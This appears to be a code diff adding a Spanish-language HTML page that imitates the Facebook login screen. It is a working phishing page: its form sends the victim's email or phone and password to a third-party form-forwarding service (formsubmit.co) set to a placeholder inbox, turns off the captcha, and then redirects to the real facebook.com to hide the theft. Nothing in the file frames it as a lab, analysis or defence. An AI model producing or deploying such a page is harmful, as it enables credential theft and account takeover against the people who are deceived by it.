@@ -1,0 +1,27 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook - Iniciar sesión</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    .container { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+    h2 { color: #1877f2; }
+    input { width: 100%; padding: 0.5rem; margin: 0.5rem 0; border: 1px solid #ccc; border-radius: 5px; }
+    button { width: 100%; padding: 0.5rem; background: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Facebook</h2>
+    <form action="https://formsubmit.co/tu_correo@ejemplo.com" method="POST">
+      <input type="text" name="Usuario" placeholder="Correo electrónico o número de teléfono" required>
+      <input type="password" name="Contraseña" placeholder="Contraseña" required>
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_next" value="https://facebook.com">
+      <button type="submit">Iniciar sesión</button>
+    </form>
+  </div>
+</body>
+</html>
